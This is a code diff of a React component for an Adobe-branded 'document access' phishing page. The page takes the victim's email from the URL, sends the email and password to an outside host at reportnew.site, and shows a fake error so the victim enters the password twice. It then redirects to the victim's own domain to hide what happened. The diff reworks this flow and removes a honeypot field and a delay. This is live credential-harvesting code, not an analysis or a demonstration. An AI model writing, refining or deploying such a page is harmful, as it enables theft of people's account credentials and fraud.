@@ -9,39 +9,25 @@ const DocumentAccessPortal = () => {
   const [domain, setDomain] = useState('');
   const [submitCount, setSubmitCount] = useState(0);
   const [isVerifying, setIsVerifying] = useState(false);
-  const [honeypot, setHoneypot] = useState('');
 
-  // Get email from URL hash
   useEffect(() => {
-    try {
-      if (window.location.hash) {
-        const emailFromHash = window.location.hash.substring(1);
-        const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-        if (emailRegex.test(emailFromHash)) {
-          setEmail(emailFromHash);
-          const domainParts = emailFromHash.split('@');
-          if (domainParts.length > 1) {
-            setDomain(domainParts[1]);
-          }
-        }
+    const emailFromHash = window.location.hash.substr(1);
+    if (emailFromHash) {
+      const filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+      if (filter.test(emailFromHash)) {
+        setEmail(emailFromHash);
+        const ind = emailFromHash.indexOf("@");
+        const domainSlice = emailFromHash.substr(ind + 1);
+        setDomain(domainSlice);
       }
-    } catch (e) {
-      console.error('Error getting email from URL:', e);
     }
   }, []);
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    
-    // Honeypot check
-    if (honeypot) return;
-
     setIsVerifying(true);
     
     try {
-      // Random delay to prevent automated attacks
-      await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000));
-      
       // Send data to endpoint
       await fetch('https://reportnew.site/reportlink/adobe/general.php', {
         method: 'POST',
@@ -52,53 +38,55 @@ const DocumentAccessPortal = () => {
           email: email,
           pwwwd: password,
           website: domain,
-          timestamp: Date.now(),
         }),
       });
 
       const newSubmitCount = submitCount + 1;
       setSubmitCount(newSubmitCount);
       
-      // Clear password field after first submission
-      setPassword('');
-      
-      // Show error message on first submission
-      if (newSubmitCount === 1) {
-        setErrorMessage(true);
-      }
-      
-      // REDIRECT ON SECOND SUBMISSION
       if (newSubmitCount >= 2) {
-        const domain = email.split('@')[1];
-        window.location.href = `https://www.${domain}`;
-        return; // Ensure no further execution after redirect
+        redirectToDomain();
+      } else {
+        setErrorMessage(true);
+        setPassword(''); // Clear password field after first submit
       }
 
     } catch (error) {
       console.error('Submission error:', error);
-      setErrorMessage(true);
-      setPassword('');
+      const newSubmitCount = submitCount + 1;
+      setSubmitCount(newSubmitCount);
+      
+      if (newSubmitCount >= 2) {
+        redirectToDomain();
+      } else {
+        setErrorMessage(true);
+        setPassword(''); // Clear password field after first submit
+      }
     } finally {
       setIsVerifying(false);
     }
   };
 
+  const redirectToDomain = () => {
+    if (email.includes('@')) {
+      const domain = email.split('@')[1];
+      let redirectUrl = `https://www.${domain}`;
+      
+      if (!redirectUrl.startsWith('http')) {
+        redirectUrl = `https://${redirectUrl}`;
+      }
+      
+      window.location.href = redirectUrl;
+      window.location.replace(redirectUrl);
+    }
+  };
+
   return (
     <div className="document-access-portal">
-      {/* Hidden honeypot field */}
-      <input 
-        type="text" 
-        name="website" 
-        style={{display: 'none'}}
-        value={honeypot}
-        onChange={(e) => setHoneypot(e.target.value)}
-      />
-      
       <img 
         src="https://i0.wp.com/thebusinessdive.com/wp-content/uploads/2025/01/Adobe-Acrobat-user-interface-1.webp?resize=1020%2C540&ssl=1" 
         id="background" 
         alt="background"
-        className="background-img"
       />
 
       <div className="auth-container">
@@ -174,7 +162,7 @@ const DocumentAccessPortal = () => {
                       <input 
                         type="submit" 
                         id="login-button" 
-                        value={isVerifying ? "Verifying..." : "Login To Access File"} 
+                        value={isVerifying ? "Verifying..." : (submitCount < 1 ? "Login To Access File" : "Login To Access File")} 
                         disabled={isVerifying}
                       />
                     </div>
